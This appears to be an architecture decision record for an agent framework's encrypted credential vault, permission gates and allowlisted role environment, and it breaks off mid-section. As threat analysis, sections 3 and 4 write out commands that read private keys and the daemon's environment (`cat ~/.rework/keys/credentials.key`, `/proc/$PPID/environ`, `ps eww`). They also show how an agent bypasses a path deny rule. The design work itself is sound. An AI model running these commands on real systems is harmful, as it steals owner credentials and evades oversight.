# ADR 0009: Credentials and permissions (secrets in the Library, one permission system)

## Status

Proposed (design only; no code in this ADR's commit). ADR 0000 says an ADR is normally
written in the same commit as the code that enacts it; this one is deliberately written
first because the change is large, touches both stores, the executor and the TUI, and the
owner's decisions below are settled. The three phases in section 13 each land under this
ADR, and the Status moves to Accepted (with an `## Amendments` section for anything that
changed on contact with the code) when phase 3 lands.

## Context

Agents in rework need things only the owner has: a GitHub token for `gh`, a registry
token, a database URL, an SSH key for a deploy host. Today there is no place for them.
The owner either pastes the value into a chat or a task brief, where it goes straight to a
model provider and into `chat_messages`, or exports it in the daemon's shell, where every
command of every role inherits it. At the same time rework gives agents real power and has
no mechanical brake on it. What exists today:

- **The Library has no secret type.** `ItemType` is `skill | tool | report | memory`
  (`src/rework/library/model.py:27-31`). An item's `body` is plaintext in the index row
  (`library/store.py:31`, `LibraryItem.body` at `library/model.py:65`), and
  `GitLibrary.write_body()` (`library/store.py:486-505`) writes it as a markdown file at
  `GitLibrary.body_path_for()` (`library/store.py:483`) and commits it to the canonical
  library git repo, which is mirrored to GitHub. Anything that flows through
  `curation.contribute()` (`library/curation.py:152`, git write at `:215-217`) is therefore
  published history. A secret must never go down this path.
- **Nothing redacts anything.** There is no masking or redaction primitive anywhere in
  `src/rework`. `run_command` returns raw process output to the model after only a length
  cut (`nodes/tools.py:227-234`). The tool loop stores every tool result in its transcript
  (`nodes/toolloop.py:436`), writes the whole transcript to disk (`_save_loop`,
  `nodes/toolloop.py:126-134`), publishes tool arguments and results as events
  (`nodes/toolloop.py:224-236`, `:428`), and the JSON log formatter writes `getMessage()`
  verbatim (`logs.py:60-79`). Whatever a command prints is persisted in at least five
  places.
- **The jail is advisory.** The `run_command` jail in `nodes/tools.py` is documented as
  advisory (quoted in section 8). The shell string is passed to `create_subprocess_shell`
  (`nodes/tools.py:208`) with the daemon's whole environment (`role_env`,
  `nodes/tools.py:291`, `env = dict(os.environ)` at `:308`). That is a second leak
  channel, independent of the missing secret store: every `run_command` of every role can
  `printenv` and read each provider key (`load_env_file` copies `~/.rework/rework.env`
  into `os.environ`, `config.py:44-45`), `REWORK_DB` (a Postgres URL carries its
  password) and anything else the daemon was started with, and print it into tool output,
  logs and the model's context. Section 4 closes that channel.
- **Permission gates exist, but nothing on the role execution path asks them.**
  `GateKind.PERMISSION` ("allow / deny -> approved bool", `kernel/state/records.py:58`)
  is asked today only by the orchestrator agent: a turn-cap gate marked
  `asked_by="engine"` (`orchestrator/agent.py:1303-1310`) and a budget gate marked
  `asked_by="orchestrator"` (`:1351-1355`). No executor opens one, so no tool call of a
  role is ever gated. The TUI already renders Allow / Deny for the kind
  (`tui/views/gates.py:48`). The `gates` table has exactly the columns
  `id, mission_id, kind, question, status, decision_note, decision, spec, for_run,
  created_at, decided_at` in both stores (`kernel/state/sqlite.py:74-86`,
  `kernel/state/postgres.py:85-97`); `spec` is free-form JSON that
  `GateManager.request` passes through (`kernel/gates.py:87-115`). Idempotent re-asking
  after a restart is an existing pattern, done by lookup, not by derived ids:
  `list_gates(mission)` filtered on `spec["_call"]` (`orchestrator/agent.py:1232-1240`),
  because `GateManager.request` always mints a random `new_id("gate")`
  (`kernel/gates.py:99`).
- **Skills, tools and the rest of the Library are open to every role.** Visibility is the
  only control: an ACTIVE item's body is served to any caller by `library_read`
  (`library/tools.py:80-95`) and by the MCP server's `get` (`library/mcp.py:45-55`), and
  tools are gated once, on activation
  (`library/curation.py:3-7`, `accept_status` at `:129`).

The owner has settled the following. This ADR designs around them and does not reopen them.

1. Credentials are a new Library item type, `credential`. Agents find them like skills;
   the value is encrypted asymmetrically (any machine can add or rotate with a public key;
   only the daemon host holds the private key and decrypts at the moment of use).
2. Values are never shown to a model and never leak into logs or chat. Agents request a
   credential by name; rework injects it as an environment variable for that one command.
   Every held value is redacted from everything stored or shown. A secret pasted into the
   TUI chat is intercepted before it reaches a model.
3. When an agent proposes a credential it proposes the policy and the owner confirms it
   through a gate; when the owner adds one in the TUI the owner sets the policy.
4. One permission system for credentials, skills and tools: scope plus approval mode, a
   permission gate naming role, item and exact command, a hard stop enforced mechanically
   and failing closed, explicitly not the mechanism that decides what agents see, with an
   audit trail the TUI can show.
5. `run_command` gets an editable destructive-command policy where ambiguous matches ask.
6. Model provider API keys stay with the providers (`models.json`, `rework.env`) and are
   out of scope.
7. (Added by the owner in the second audit round; it overrides an earlier draft that
   recorded this as a known gap.) Role commands do not inherit the daemon's environment:
   they get a built-in allowlist, everything else is dropped, and a credential's value is
   added only for the one granted call (section 4).

## Decision

### 1. Data model and storage (both stores)

**The item rides the existing Library model.** `ItemType` gains `CREDENTIAL = "credential"`.
A credential is a normal `library_items` row (`library/store.py:25-40`): `name` is the
handle the agent requests, `description` says what it is for, `tags` help search,
`provenance` records who created it (`Provenance`, `library/model.py:45-52`), `status`
works as it does for tools: `PROPOSED` until the owner confirms, then `ACTIVE`, `RETIRED`
as the off switch (`library/model.py:34-38`). Search, ranking, the hybrid embedder
(`library/embeddings.py:71`, which embeds only name, description and tags) and `record_use`
work unchanged. The "how to use" text is the item's `body`, as for a skill, with one
difference below. **No column is added to `library_items` and nothing is added to
`LibraryItem`**; the ciphertext deliberately lives in another table so that no
`SELECT *`, `_row_to_item` (`library/store.py:69-96`), `search`, `get_item`, MCP `get` or
`read_text` can ever carry it, by accident or by a future refactor.

**A credential never touches the git write path.** `contribute()` branches on type before
`git.write_body` (`library/curation.py:215-217`): credential items are written by a dedicated
`CredentialVault` (section 2) and their `body_path` is NULL, so `body_path_for()` and
`write_body()` are never called for them. The usage text stays in the DB row only
(`LibraryItem.body`). `read_item_body` (`library/store.py:443`) then falls back to
`git.read_body`, which returns None when there is no `body_path` (`:507-509`); nothing to
leak. `contribute()` with `type=credential` from an agent tool or the MCP server is
refused with a pointer to `credential_propose` (section 3). Before a credential row is
written, `name`, `description`, `tags` and `body` are scanned with the same detector the
chat uses (section 5); a hit refuses the write ("this looks like a secret value; values go
in the masked field only"). The only data that reaches the DB is metadata and ciphertext;
nothing secret reaches the mirrored repo.

**New tables.** All are `CREATE TABLE IF NOT EXISTS`, additive, and identical in shape on
SQLite and Postgres (the `DOUBLE PRECISION` to `REAL` rewrite at `library/store.py:46`
already handles the one type difference). The envelope is stored as TEXT (base64url), not
BLOB/BYTEA, so the two backends cannot diverge on binary handling.

Library side, in `library/store.py` `_DDL` (opened for both backends by
`open_library_store`, `library/store.py:412-440`):

```sql
CREATE TABLE IF NOT EXISTS credential_keys (
    key_id TEXT PRIMARY KEY,            -- first 8 bytes of SHA-256(public key), hex
    public_key TEXT NOT NULL,           -- base64url, 32-byte X25519
    status TEXT NOT NULL,               -- active | retired
    created_at DOUBLE PRECISION NOT NULL
);
CREATE TABLE IF NOT EXISTS credentials (
    item_id TEXT PRIMARY KEY,           -- library_items.id
    env_name TEXT NOT NULL,             -- the environment variable it is injected as
    envelope TEXT,                      -- the encrypted value; NULL = no value yet
    key_id TEXT,                        -- which public key encrypted it
    enc_version INTEGER NOT NULL DEFAULT 1,
    value_version INTEGER NOT NULL DEFAULT 0,   -- bumped on every rotation
    rotated_at DOUBLE PRECISION,
    updated_by TEXT NOT NULL DEFAULT ''         -- 'owner:tui', 'owner:cli', ...
);
```

State side, in `kernel/state/sqlite.py` (after the `gates` DDL at `:74-86`) and
`kernel/state/postgres.py` (after `:85-97`), because policy, grants and audit are keyed
by mission and run, which live there:

```sql
CREATE TABLE IF NOT EXISTS permission_policies (
    id TEXT PRIMARY KEY,
    subject_type TEXT NOT NULL,         -- credential | skill | tool | command
    subject_id TEXT NOT NULL,           -- a library item id, or the sentinel '*' = every item
                                        -- of subject_type (type-wide rule). Command rules
                                        -- always use '*'. NULL is never valid (section 6).
    effect TEXT NOT NULL,               -- allow | deny | ask (command rules: deny | ask only)
    approval TEXT NOT NULL,             -- never | first_use_per_mission | every_use; only
                                        -- meaningful for effect=allow; 'never' for deny
    scope TEXT NOT NULL,                -- JSON, all five keys mandatory (section 6)
    matcher TEXT,                       -- JSON, command rules only (section 8)
    source TEXT NOT NULL,               -- owner | agent_proposed | default
    status TEXT NOT NULL,               -- active | proposed | retired; only 'active' rules
                                        -- are evaluated; any other value is malformed (section 6)
    note TEXT NOT NULL DEFAULT '',
    created_at DOUBLE PRECISION NOT NULL,
    updated_at DOUBLE PRECISION NOT NULL
);
CREATE TABLE IF NOT EXISTS permission_grants (       -- "first use per mission"
    mission_id TEXT NOT NULL, rule_id TEXT NOT NULL,
    subject_id TEXT NOT NULL,           -- the CONCRETE item id (or rule id for a command rule),
                                        -- never '*', so a type-wide rule asks once per item
    gate_id TEXT NOT NULL, granted_at DOUBLE PRECISION NOT NULL,
    PRIMARY KEY (mission_id, rule_id, subject_id)
);
CREATE TABLE IF NOT EXISTS permission_audit (        -- append-only (section 7)
    id INTEGER/BIGINT PRIMARY KEY,      -- AUTOINCREMENT / IDENTITY, as `events.seq`
    ts DOUBLE PRECISION NOT NULL,
    mission_id TEXT, run_id TEXT, role TEXT, project_id TEXT, model TEXT,
    subject_type TEXT NOT NULL, subject_id TEXT, subject_name TEXT,  -- subject_id NULL: the
                                        -- row concerns no item (command-only, chat_intercept)
    action TEXT NOT NULL, outcome TEXT NOT NULL,
    rule_id TEXT, gate_id TEXT, env_name TEXT,
    command TEXT,                       -- already redacted
    exit_code INTEGER, actor TEXT NOT NULL, detail TEXT NOT NULL DEFAULT '',
    call_hash TEXT                      -- sha256(run_id | tool | canonical args JSON); lets the
                                        -- replay design count attempts per call (section 7)
);
CREATE INDEX IF NOT EXISTS idx_audit_subject ON permission_audit(subject_id, ts);
CREATE INDEX IF NOT EXISTS idx_audit_call ON permission_audit(run_id, call_hash);
CREATE INDEX IF NOT EXISTS idx_audit_mission ON permission_audit(mission_id, ts);
```

(The `INTEGER/BIGINT` line is shorthand: SQLite uses `INTEGER PRIMARY KEY AUTOINCREMENT`
and Postgres `BIGINT GENERATED ALWAYS AS IDENTITY`, exactly as `events` does at
`kernel/state/sqlite.py:87-88` and `kernel/state/postgres.py:100-101`.) The store interface
gets insert and read methods for audit and none that update or delete a row, on both
backends; the conformance suite parametrizes over both (CLAUDE.md "Dev commands").

The library tables and the state tables share one database substrate but use separate
connections (`library/store.py:4`). The policy engine therefore reads item status through
the library handle and policy rows through the state store; it never joins across them.

### 2. The encryption scheme

**Scheme: X25519 + HKDF-SHA256 + AES-256-GCM with an ephemeral sender key** (an ECIES
construction), implemented with `cryptography` (`hazmat`: `X25519PrivateKey`, `HKDF`,
`AESGCM`). `cryptography` is already in `uv.lock` (`uv.lock:550`, as a transitive
dependency); this ADR makes it a direct dependency in `pyproject.toml` (`dependencies`,
`pyproject.toml:9-32`). No libsodium and no new native library: one wheel, which every
rework machine already installs.

Encrypting (any machine, public key only):

1. Generate an ephemeral X25519 keypair `(e, E)`.
2. `shared = X25519(e, R)` where `R` is the recipient public key from `credential_keys`.
3. `key = HKDF-SHA256(shared, salt = E || R, info = "rework credential v1", len = 32)`.
4. Pad the value to a multiple of 64 bytes with a 2-byte length prefix (hides length).
5. `ct = AES-256-GCM(key, nonce = 12 random bytes, plaintext, aad)` where
   `aad = version || alg || key_id || E || item_id`.
6. Discard `e`. The sender cannot decrypt what it just wrote.

**Envelope** (stored as `rwc1.` + base64url of the concatenation):

| field | bytes | content |
|---|---|---|
| version | 1 | `0x01`, the envelope layout |
| alg id | 1 | `0x01` = X25519 / HKDF-SHA256 / AES-256-GCM (room for later algs) |
| recipient key id | 8 | selects the private key; may be an old key during rotation |
| ephemeral public key | 32 | `E` |
| nonce | 12 | random |
| ciphertext + tag | n + 16 | AES-GCM output; tag authenticates ciphertext and `aad` |

`item_id` is in the AAD, so an envelope *copied* from one credential row to another
decrypts to an authentication failure, not to the other credential's value. That is all the
AAD buys. It does **not** authenticate the writer: the public key is public and the sender
key is ephemeral, so anyone who can write the `credentials` table can encrypt a value of
their own choosing to the active public key, bind it to any `item_id`, and store it as a
perfectly valid envelope. A DB writer can also delete or swap rows. Neither is prevented
here (owner-signed envelopes would be the fix and are not designed); the exposure and the
partial detection (`rotated_at`, `updated_by`, the `rotate` audit row, which a DB writer can
also forge) are stated in section 11.
Any change to the layout or algorithm bumps the version/alg byte and
`credentials.enc_version`; decrypt dispatches on them and an unknown pair fails closed.

**Why this and not a sealed box.** A libsodium sealed box would also work and is listed
under Alternatives. The deciding factors: AEAD with associated data lets the envelope bind
to the item and carry an algorithm id; no new native dependency; and explicit, reviewable
key schedule. Authenticated ciphertext means a flipped bit is a clean `unavailable:
corrupt`, never a garbage value injected into a command.

### 3. Key lifecycle, agent-proposed credentials, and the missing private key

**Files.** On the daemon host (rewvis): `~/.rework/keys/` (mode 700, the state dir is
`DEFAULT_STATE_DIR`, `config.py:17`) holds `credentials.key` (the 32-byte X25519 private
key, mode 600) and `credentials.pub`. The private key never leaves that directory and is
never stored in the database, an env file, or any role's environment variable.

**What does and does not protect that directory (read this before trusting it).** Only
the file mode, and only against *other OS users*. `role_env` sets `REWORK_TARGETS`,
`REWORK_ENV_FILE`, `REWORK_TUI_SETTINGS`, `REWORK_LOG_DIR` and `REWORK_RUN_DIR` to a
per-run scratch directory (`nodes/tools.py:319-323`), but each is an
`env.setdefault(...)`: a default that rework's own CLI would pick up if a command ran it.
It hides nothing and restricts nothing on disk. A role runs as the daemon's OS user under
an advisory jail (section 8). Today it also has the daemon's whole environment copied in
(`role_env`, `nodes/tools.py:291`, `:308`); section 4 closes that *environment* channel in
phase 1 and only that channel, so the file channel below stays open. One `run_command` can
therefore `cat ~/.rework/keys/credentials.key`, find the database (the default sqlite
path, `config.py:68-69`, `:91`, or a Postgres URL kept in a file such as `rework.env`,
`config.py:20-46`) and decrypt every credential, with no policy check, no gate and no
audit row. The key directory is **not** a boundary against a role; section 11 says so, and it
stays true until the key is owned by something a role cannot read: a Docker executor (M7)
or a separate OS user for the daemon. *Optional and advisory only:* the default command
rules (section 8) may include a `deny` rule on argv that mention `~/.rework/keys` or
`credentials.key`. That catches an agent that stumbles on the directory; it is exactly as
weak as every command rule (`cd ~/.rework/keys && cat cred*`, or a script, passes) and is
never to be described as protecting the key.

**Creation.** `rework keys init` on the daemon host, run once by the owner. It generates
the keypair, writes the files with `O_EXCL` at mode 600, and inserts `(key_id,
public_key, active)` into `credential_keys`. Nothing creates a key implicitly: a daemon
that silently minted a new key after losing the old one would orphan every stored value.

**Public key distribution and pinning.** The public key is not secret; it lives in
`credential_keys`, so a TUI on any machine reads it from the shared store (ADR 0006,
"Store-only"). Because a writer to the DB could substitute their own public key, the encrypting side
pins the fingerprint on first use in `~/.rework/keys/pinned`. The shared encrypt helper
used by `rework credential add|rotate` on any machine (phase 1) refuses to encrypt on a
mismatch; the TUI (phase 3) shows a blocking "the credential key changed" prompt instead. `rework keys fingerprint` prints the key
id on rewvis for out-of-band comparison.

**Backup and restore.** `rework keys export <file>` writes the private key wrapped under
a passphrase (scrypt + AES-256-GCM) for offline storage; `rework keys import <file>`
restores it. Keep the export away from database backups: database backup plus key backup
in one place is full compromise (threat model).

**Rotating the keypair.** `rework keys rotate`: generate a new pair, add it as `active`,
mark the old `retired`, and re-wrap every credential on the daemon (decrypt with the key
named by the envelope's key id, encrypt to the new key, one transaction per row,
`key_id` and `rotated_at` updated). Decryption selects the key by the envelope key id, so a
half-finished rotation still works. The old private key file is renamed
`credentials.<key_id>.key` and kept until `rework keys rotate --finish` verifies no row
references it; deleting it is then the owner's call. Rotating the keypair does not change
any secret value: if the old private key was exposed, values must also be rotated at the
provider.

**Rotating a value.** Owner action (TUI or `rework credential rotate <name>`): enter the
new value masked, encrypt to the active public key, replace `envelope`, bump
`value_version`, set `rotated_at`, write a `rotate` audit row. The old envelope is
overwritten, not versioned; copies in older DB backups stay decryptable with the old
private key, so value rotation at the provider is the real remedy for a leak.

**How an agent adds a credential.** Agents never supply a value: a value in a tool
argument would sit in the agent's transcript, which is exactly what this design prevents.
The agent calls a new tool `credential_propose(name, description, how_to_use, env_name,
proposed_policy)`. rework creates the item `PROPOSED` with no envelope plus a
`permission_policies` row `source='agent_proposed', status='proposed'`, and opens a
`GateKind.PERMISSION` gate (section 7) whose `spec` carries the proposed scope and
approval mode. The owner reviews, edits the policy if they wish, and decides on the
existing Allow / Deny gate screen (`tui/views/gates.py:48`); editing the proposed policy is
`rework permissions edit` until the TUI policy editor exists (phase 3). On Allow the owner
enters the value: with `rework credential rotate NAME` (on an item with no envelope it sets
the first value, read by masked `getpass`; the command exists from phase 1, the proposal flow it serves from phase 2) or, from phase 3, in the TUI's masked
field, which encrypts client-side. Item and policy flip to `ACTIVE`/`active` when that
first value is stored, and only if the proposal's gate was approved. On Deny the proposal
is `RETIRED`. Until a value exists the
credential resolves as `unavailable: no value set`. If an agent has found a secret in the
repo, it reports where; the owner decides whether to register it.

**Missing or wrong private key: fail closed.** At startup the daemon opens the vault.
States and consequences:

| state | what happens |
|---|---|
| private key file present, key id found | normal |
| private key file missing / unreadable | vault is `locked`: every credential resolves `unavailable: private key missing on this host`; one WARNING at start (phase 1) and a banner in the TUI Library view (phase 3) |
| envelope key id not held by this host | that credential: `unavailable: encrypted to key <id>, which this host does not hold` |
| GCM tag fails (tampered, wrong item, wrong key) | that credential: `unavailable: corrupt` plus an audit row |
| unknown version / alg | `unavailable: unsupported envelope` |

"Unavailable" means: `run_command` with that credential returns an error string to the
model naming the credential and the reason, **does not run the command**, writes an audit
row `outcome=unavailable`, and opens no gate (asking the owner to approve something that
cannot work is noise). Nothing is silently skipped, no environment variable of the same
name is substituted from the daemon's own environment, and the command is not run without
the credential. A daemon on another host (an ADR 0008 preview or a sandbox) that lacks the
private key gets exactly this behaviour, which is the intended isolation.

### 4. The injection path

The unit of use is one `run_command` call. A new outermost executor wrapper,
`PermissionExecutor`, wraps the role's executor the way `LibraryAwareExecutor` does
(`library/tools.py:205-245`). Each role builds its stack by hand today
(`library_executor(ctx, ComplaintAwareExecutor(EscalationAwareExecutor(executor, ctx), ...))`
at `roles/builtin/coder.py:236-239`, `auditor.py:191-194`, `investigator.py:107-110`), so
the new wrapper is applied at those three sites, outside `library_executor`. It must be
outside because `LibraryAwareExecutor` answers `library_*` itself and never delegates them
inward (`library/tools.py:224-238`); a wrapper inside it could not see `library_read`
(section 6). The wrapper acts on exactly two tool names, `run_command` (this section) and
`library_read` (section 6; phase 1 delegates it unchanged, the policy check on it
lands in phase 3), and delegates every other call unchanged. `run_command`'s
`ToolSpec` in `nodes/tools.py` gains an optional `credentials: [name]` argument.

1. **Request by name.** The model calls `run_command(command="gh pr list",
   credentials=["github-token"])`. It learned the name from `library_search`
   (`library/tools.py:61-66`) or `library_read` (`:80-95`), which for a credential return
   name, description, how-to-use, env var name and scope summary, never a value. Search
   output for a credential adds `(use via run_command credentials=[...])`.
   The names resolve through `LibraryHandle.resolve` (`library/tools.py:68-78`) and must be
   `type=credential`, `status=ACTIVE`.
2. **Policy check** (section 6), including the destructive-command policy (section 8).
   Result: allow, deny, or ask. *Phase 1 evaluates steps 1-3 of section 6 and approval
   `never` only: a rule that would ask is evaluated as deny, and there are no command
   rules yet; the command policy and `ask` arrive in phase 2 (section 13).*
3. **Gate if required** (section 7; phase 2, so in phase 1 this step never runs). The wrapper blocks the tool call like
   `ask_orchestrator` does (`nodes/escalate.py:1`, a blocking tool rather than an
   `interrupt()`), polling the gate row, which is the source of truth (CLAUDE.md hard
   rule 3).
4. **Audit `started` row** is written before anything is decrypted. If the audit write
   fails, the call is denied.
5. **Decrypt on the daemon host.** The vault decrypts the envelope in memory with the
   private key (a fresh decrypt at use, not the resident redaction copy, so a rotated or
   corrupt envelope is caught here). Where the plaintext then lives, and for how long, is
   the single statement below.
6. **Environment for that one command.** The base is `role_env(workdir)`
   (`nodes/tools.py:214`), which from phase 1 is the **allowlisted** environment (the
   subsection below), never a copy of the daemon's. Only now, after steps 2-4 passed, does
   the wrapper add `env[env_name] = value` for each granted credential, on top of that
   base; a credential is never inherited. The value reaches the spawn site
   (`nodes/tools.py:208-215`) through a per-call `ContextVar` that `PermissionExecutor`
   sets around its inner `execute` and resets in a `finally`, and that `LocalExecutor`
   reads once and merges into the `env=` of that one `create_subprocess_shell`. A model
   cannot set it (it is not a tool argument; the wrapper removes `credentials` from the
   args it delegates). `os.environ` is never modified. The value is never put in the
   command string, a file, `argv`, or the process title (so `ps` shows nothing).
   Reserved names (`PATH`, `HOME`, `SHELL`, `LD_*`, `PYTHON*`, `REWORK_*`) and any name on
   the effective environment allowlist cannot be a credential's `env_name`: the vault
   refuses them at creation, and step 1 re-checks at use (an allowlist edited later makes
   that credential `unavailable: env_name is on the role environment allowlist`), because
   a name the daemon environment passes to every command would defeat "visible in the one
   granted call only".
7. **Output through the redactor** (section 5), as bytes, before decode, truncation and
   return.
8. **Audit `finished` row** with the exit code and the redacted command.

**Plaintext lifetime: the one statement (every other section refers here).** A decrypted
value exists only on the daemon host, in exactly three places:

1. **The redactor's resident needle set** (section 5): from daemon start, or from the poll
   that notices a newly added or rotated credential, until the daemon exits, the
   credential is rotated or retired (its needles are dropped on the next poll), or the
   vault locks. This is the longest-lived copy and it is unavoidable: the redactor can
   only remove values it holds.
2. **`PermissionExecutor`'s one local variable, the per-call `ContextVar` that carries it to
   the spawn site, and the merged `env` dict `LocalExecutor` builds for that spawn**, from
   the decrypt in step 5 to the return of that call. The wrapper drops the variable and
   resets the `ContextVar` in a `finally`; the merged dict is a local of the spawn and
   dies with it.
3. **The child process's environment block**, for as long as that process and any
   descendants live. The timeout path kills the whole process group (`_kill_tree`, defined
   at `nodes/tools.py:423`, called at `:220`); a command that backgrounds itself
   (`nohup ... &`) keeps it.

*What wipes:* only dropping references (the call's local at return; the needle entries on
rotate, retire or lock). *What cannot be wiped:* CPython `str`/`bytes` objects are not
zeroable and freed memory is not cleared (it may be reused, swapped or land in a core
dump); the child's own copy (`/proc/<pid>/environ`, inherited by descendants and
background jobs) lives until that process exits; the OS owns kernel-side copies. *Never
anywhere:* the database, any file, a log, an event, the role process's own environment
(`os.environ` is never modified, so the next command does not have it unless it asks
again and passes policy), the model context, or any non-daemon host. The one off-host
exception is the TUI's masked field, where the owner's typed value is a client-side
string until it is encrypted. It never enters the model context: tool arguments carry
credential *names* and the command string (`_short_args`, `nodes/toolloop.py:34-43`,
renders every argument, including `command`), the value is in neither, and the command
string is itself redacted at the hooks in section 5.

A command a role leaves running in the background keeps its environment: item 3 above and
the section 11 row for the child process; it is inherent to environment injection.

**The role environment is an allowlist, not an inheritance (ships in phase 1).**
Today `role_env` starts from `env = dict(os.environ)` (`nodes/tools.py:308`) and every
`run_command` of every role gets the result, through the one spawn site
(`nodes/tools.py:208-215`) that all four `LocalExecutor` construction sites reach
(`nodes/tools.py:101`, `nodes/git_ops.py:243`, `roles/builtin/auditor.py:117`,
`roles/builtin/investigator.py:110`). The owner's requirement is that this channel is
closed (the child's own inherited environment; the daemon's launch environment is a
separate path, point d), so the environment a role command receives is *built*, not filtered:

- **(a) Baseline allowlist, everything else dropped.** `role_env` starts from an empty
  dict and copies a variable from the daemon's environment only if its name is on the
  allowlist: the built-in baseline below plus the owner's list. The `dict(os.environ)`
  line is deleted, not guarded. There is no "unless it looks safe" rule, no pattern such
  as `*KEY*` or `*TOKEN*` that decides to keep or drop, and no branch that falls through
  to the parent environment, including on error (below).

  | group | names (exact, case-sensitive) |
  |---|---|
  | process basics | `PATH`, `HOME`, `USER`, `LOGNAME`, `SHELL`, `TMPDIR`, `TZ` |
  | locale and terminal | `LANG`, `LANGUAGE`, `TERM`, and the prefix `LC_*` |
  | XDG directories (paths only) | `XDG_CACHE_HOME`, `XDG_CONFIG_HOME`, `XDG_DATA_HOME`, `XDG_STATE_HOME` |
  | git identity | the prefixes `GIT_AUTHOR_*` and `GIT_COMMITTER_*` |
  | uv and python behaviour (paths and switches, never URLs) | `UV_CACHE_DIR`, `UV_PYTHON`, `UV_PYTHON_INSTALL_DIR`, `PYTHONUNBUFFERED`, `PYTHONDONTWRITEBYTECODE`, `PYTHONUTF8`, `PYTHONIOENCODING` |
  | rework scratch redirects, **set** by `role_env`, never inherited | `REWORK_TARGETS`, `REWORK_ENV_FILE`, `REWORK_TUI_SETTINGS`, `REWORK_LOG_DIR`, `REWORK_RUN_DIR` (pointing into `scratch_dir(workdir)`, `nodes/tools.py:264`) |

  Deliberately **not** on the baseline: `GIT_SSH_COMMAND` (it picks which key file git
  pushes as, and `GIT_CONFIG_COUNT`/`GIT_CONFIG_KEY_*`/`GIT_CONFIG_VALUE_*` can inject an
  `http.extraheader` carrying a token; so are `GIT_ASKPASS` and every other `GIT_*`),
  `PYTHONPATH`, `PYTHONHOME`, `VIRTUAL_ENV`, `VIRTUAL_ENV_PROMPT` (the daemon's venv must
  not leak into a role; `role_env` already strips these for repos with a
  `pyproject.toml`, and the allowlist now does it for every repo), `SSH_AUTH_SOCK`,
  proxy variables, and every `REWORK_*` other than the five scratch redirects.

  **The owner's list.** `~/.rework/role_env.toml` (`DEFAULT_STATE_DIR / "role_env.toml"`,
  `config.py:17`), TOML like `targets.toml` (`targets.py:47`), one key:

  ```toml
  # exact names; a trailing * makes a prefix. Everything not listed here or in the
  # built-in baseline is dropped from role commands.
  allow = ["SSH_AUTH_SOCK", "HTTPS_PROXY", "https_proxy", "UV_INDEX_*", "REWORK_TEST_POSTGRES"]
  ```

  The daemon re-reads it when its mtime changes, so an edit applies to the next command
  without a restart. A missing file means baseline only. A file that is unreadable, is not
  valid TOML, has `allow` that is not a list of strings, or contains a bare `*`, an empty
  string or a prefix shorter than three characters is ignored **as a whole** (baseline
  only, one ERROR log per mtime): every failure moves toward fewer variables, never more,
  and there is deliberately no `inherit_all` switch. `rework role-env show` prints the
  effective allowlist and, by name only, which variables are being dropped from **its own**
  environment plus the keys of `~/.rework/rework.env` (which the daemon loads,
  `config.py:20-46`). It cannot see the daemon's real environment (a systemd unit's
  `Environment=` lines are not in the owner's shell), so the daemon also logs the dropped
  names, never values, once at start. `rework role-env allow NAME` appends an entry. At daemon start and on each
  edit, an owner entry that names a variable rework knows is secret (`REWORK_*_KEY`, an
  `api_key_env` of `models.json`, `REWORK_DB`, `REWORK_TOKEN`, a registered credential's
  `env_name`) logs a WARNING that it is now visible to every role command. That warns on an
  explicit owner decision; it filters nothing.
- **(b) Credentials are added per command, after the gate, on top of the base.** Step 6
  above: the allowlisted base first, then the granted credential's `env_name` for that one
  call, only after steps 2-4 passed. A credential value is never read from the parent
  environment, and a variable of the same name in the daemon's environment is dropped like
  any other.
- **(c) What changes in `role_env` itself.** (1) The allowlist is built before anything
  else, so it also applies on the early return for a repo with no `pyproject.toml`
  (`nodes/tools.py:325`, `if workdir is not None and not (workdir / "pyproject.toml").exists()`),
  which today returns the whole inherited environment. (2) The five scratch redirects
  become plain assignments instead of `env.setdefault(...)` (`nodes/tools.py:319-323`):
  with nothing inherited there is nothing to defer to. (3) The venv stripping still reads
  `VIRTUAL_ENV` and `sys.prefix` from the daemon to know which `PATH` entries to remove,
  but never copies `VIRTUAL_ENV` into the child. (4) An existing test asserts the old
  inheritance: `test_a_plain_repo_keeps_the_daemons_tools`
  (`tests/unit/test_nodes.py:359-366`) expects `$VIRTUAL_ENV` to be visible in a plain
  repo. Phase 1 rewrites it: a toy repo keeps the daemon's *tools* through `PATH`, not
  through `VIRTUAL_ENV`. `test_role_commands_do_not_inherit_the_daemons_venv`
  (`:334-356`) and the scratch-dir tests (`:528` onward) should pass unchanged. A search of
  `tests/unit/test_nodes.py` finds `setenv` in only those two tests (`:344-346`, `:364`); the
  `delenv` calls at `:542` and `:639` only remove variables and are unaffected. Phase 1 runs
  the whole suite to find any other test that relies on an inherited variable.
- **(d) This closes the role command's own inherited ENVIRONMENT only, not the FILE
  channel.** A role still runs as the daemon's OS user. The private key file (section 3),
  the default database path (`config.py:68-69`, `:91`), `~/.rework/rework.env` (which holds
  provider keys), `~/.rework/role_env.toml` itself, and any token a tool keeps on disk under
  `HOME` (for example `gh`'s own login, or private keys in `~/.ssh`) stay readable to a role.
  So does **the daemon's own launch environment, through `/proc/<daemon pid>/environ` and
  `ps eww`**: a role's shell is a child of the daemon (`create_subprocess_shell`,
  `nodes/tools.py:208`) running as the same OS user, so `$PPID` is the daemon's pid and
  `tr '\0' '\n' </proc/$PPID/environ` (or `ps eww -p $PPID`) prints the environment the
  daemon was *started* with: a systemd unit's `Environment=` lines and `EnvironmentFile=`
  entries (the `rework.env` convention, `config.py:21-24`), shell exports such as
  `REWORK_DB` and provider keys. The allowlist does nothing about this, because it filters
  what the *child* receives, not what the same user can read of the *parent*. One
  qualification: keys that `load_env_file` adds to `os.environ` after the daemon has
  started (`config.py:20-46`) generally do not appear in `/proc/<pid>/environ`, which shows
  the initial environment block, but they do sit in `rework.env`, which is already listed
  above. **Only a separate OS user for the daemon or the Docker executor (M7) closes
  these channels.** That is the section 11 "does not protect" story, unchanged; nothing in
  this subsection contradicts it, and it must not be read as "roles can no longer reach
  secrets". The named `printenv` tests (point g) exercise the child's environment only and
  would pass while `/proc/<daemon pid>/environ` stays open; they are not evidence that
  this path is closed.
- **(e) Provider keys stay with the providers (section 10).** The allowlist removes them
  from the role environment; it does not move them into the Library, encrypt them or put
  them behind the permission system. The redactor's redact-only needles for them
  (section 5) are therefore **belt-and-braces**, not the only defence: they catch a key a
  role read from a file, or one the owner deliberately re-adds to the allowlist.
- **(f) What will break, stated honestly.** Daemon-side subprocesses are not role commands
  and keep the daemon's environment: `gh pr create` (`nodes/gh.py:15-55`), the notify command
  (`kernel/gates.py:47-62`, which passes `{**os.environ, ...}`), previews, and the engine's own
  git calls, which use `create_subprocess_exec` with no `env=` (`git_ops._run`,
